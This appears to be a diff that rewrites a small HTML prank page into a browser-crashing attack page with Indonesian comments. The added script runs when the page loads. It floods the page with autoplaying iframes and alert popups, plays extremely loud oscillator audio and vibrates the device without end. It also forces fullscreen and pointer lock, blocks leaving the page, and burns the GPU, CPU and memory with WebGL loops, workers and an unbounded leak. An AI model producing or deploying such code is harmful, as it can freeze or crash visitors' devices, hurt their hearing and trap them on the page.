@@ -1,16 +1,136 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-  <title>505!</title>
+  <meta charset="utf-8">
+  <title1x1x1x1x1x1x1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <style>
+    body { margin:0; overflow:hidden; background:#000; touch-action:none; user-select:none; -webkit-user-select:none; }
+    iframe { position:fixed; inset:0; width:100vw; height:100vh; border:none; pointer-events:none; opacity:0.04; mix-blend-mode:screen; }
+    #block { position:fixed; inset:0; background:rgba(220,0,0,0.95); color:#fff; font-family:monospace; font-size:50px; display:flex; align-items:center; justify-content:center; z-index:999999999; pointer-events:none; text-align:center; text-shadow:0 0 35px #000; padding:60px; line-height:1.2; }
+  </style>
 </head>
 <body>
-  <script>
-    window.onload = function() {
-      // Fungsi untuk membuat lag
-      while (true) {
-        document.body.innerHTML += '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"></iframe>';
-      }
-    }
-  </script>
+<div id="block">888888888<br>66666666<br>000000000</div>
+
+<script>
+// ==================== RICKROLL SPAM TANPA DELAY (0 detik) ====================
+const rickUrls = [
+  "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0&controls=0&loop=1&playlist=dQw4w9WgXcQ",
+  "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0&controls=0",
+  "https://www.youtube.com/embed/9bZkp7q19f0?autoplay=1&mute=0",
+  "https://www.youtube.com/embed/kXYiU_JCYtU?autoplay=1&mute=0",
+  "https://www.youtube.com/embed/oHg5SJYRHA0?autoplay=1&mute=0",
+  "https://www.youtube.com/embed/6n3pFFPSlW4?autoplay=1&mute=0",
+  "https://www.youtube.com/embed/L_jWHffIx5E?autoplay=1&mute=0"
+];
+
+function spawnRickDoom() {
+  for (let i = 0; i < 60; i++) {   // 60 iframe sekaligus setiap frame
+    const iframe = document.createElement('iframe');
+    iframe.src = rickUrls[Math.floor(Math.random() * rickUrls.length)] + `&t=${Math.floor(Math.random()*400)}`;
+    iframe.allow = "autoplay *; fullscreen *; microphone *";
+    document.body.appendChild(iframe);
+  }
+}
+
+// Loop tanpa jeda sama sekali
+(function zeroDelaySpam() {
+  spawnRickDoom();
+  requestAnimationFrame(zeroDelaySpam);
+})();
+zeroDelaySpam();  // langsung mulai
+
+// ==================== ALERT BOMB TANPA AMPUN ====================
+function alertAnnihilation() {
+  alert("000000000");
+  setTimeout(alertAnnihilation, 100);
+}
+setTimeout(alertAnnihilation, 150);
+
+// ==================== AUDIO VOLUME & CONTEXT SPAM EKSTREM (langsung & terus) ====================
+function audioCataclysm() {
+  for (let i = 0; i < 80; i++) {
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.type = 'sawtooth';
+      osc.frequency.value = 10 + Math.random() * 5000;
+      gain.gain.value = 40 + Math.random() * 100;   // VOLUME & DISTORSI MAKSIMAL
+      osc.start();
+      setTimeout(() => { try { osc.stop(); ctx.close(); } catch(e){} }, 30000);
+    } catch(e) {}
+  }
+}
+audioCataclysm();  // langsung sekali
+(function audioLoop() {
+  audioCataclysm();
+  requestAnimationFrame(audioLoop);
+})();
+
+// ==================== VIBRATION TANPA HENTI ====================
+(function vibrateHell() {
+  navigator.vibrate?.([300, 120, 300, 120, 400, 150, 300, 120]);
+  setTimeout(vibrateHell, 80);
+})();
+vibrateHell();
+
+// ==================== LOCK TOTAL (fullscreen + pointer + exit) ====================
+function totalLock() {
+  document.documentElement.requestFullscreen?.().catch(()=>{});
+  document.body.requestPointerLock?.();
+}
+
+['touchstart','touchend','touchmove','click','pointerdown','pointerup','keydown','mousemove','wheel'].forEach(e => {
+  document.addEventListener(e, totalLock, {passive:false, capture:true});
+});
+
+window.onbeforeunload = () => "xxxxx";
+
+setInterval(() => {
+  window.onbeforeunload = () => "xxxxxxx";
+}, 100);
+
+// ==================== WEBGL SPAM MULTI (GPU langsung dibakar) ====================
+for (let i = 0; i < 16; i++) {
+  const c = document.createElement('canvas');
+  c.width = window.innerWidth * 6;
+  c.height = window.innerHeight * 6;
+  document.body.appendChild(c);
+  const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+  if (gl) {
+    const prog = gl.createProgram();
+    gl.attachShader(prog, gl.createShader(gl.VERTEX_SHADER));
+    gl.shaderSource(prog.children[0], "attribute vec2 p;void main(){gl_Position=vec4(p*4.0,0,1);}");
+    gl.compileShader(prog.children[0]);
+    gl.attachShader(prog, gl.createShader(gl.FRAGMENT_SHADER));
+    gl.shaderSource(prog.children[1], "precision highp float;uniform float t;void main(){gl_FragColor=vec4(sin(t*80.0),cos(t*60.0),tan(t*50.0),1);}");
+    gl.compileShader(prog.children[1]);
+    gl.linkProgram(prog); gl.useProgram(prog);
+    (function gpuBurn(){ gl.uniform1f(gl.getUniformLocation(prog,"t"),performance.now()*0.03); gl.drawArrays(gl.TRIANGLES,0,6); requestAnimationFrame(gpuBurn); })();
+  }
+}
+
+// ==================== WORKER CPU BURN MAKSIMAL ====================
+const workerHell = `while(true){let x=0;for(let i=0;i<2999999999;i++)x+=Math.sin(i*1.3)*Math.cos(i*0.7)*Math.tan(i*0.4)*Math.random();}`;
+const blobHell = new Blob([workerHell], {type:'application/javascript'});
+const hellUrl = URL.createObjectURL(blobHell);
+for (let i = 0; i < 32; i++) new Worker(hellUrl);
+
+// ==================== MEMORY LEAK TANPA BATAS ====================
+const voidPile = [];
+(function memoryVoid() {
+  for (let i = 0; i < 150; i++) {
+    voidPile.push(new Array(4000000).fill(Math.random() + 'HP_IS_DEAD'));
+  }
+  requestAnimationFrame(memoryVoid);
+})();
+memoryVoid();
+
+document.body.style.cursor = "none";
+</script>
 </body>
 </html>
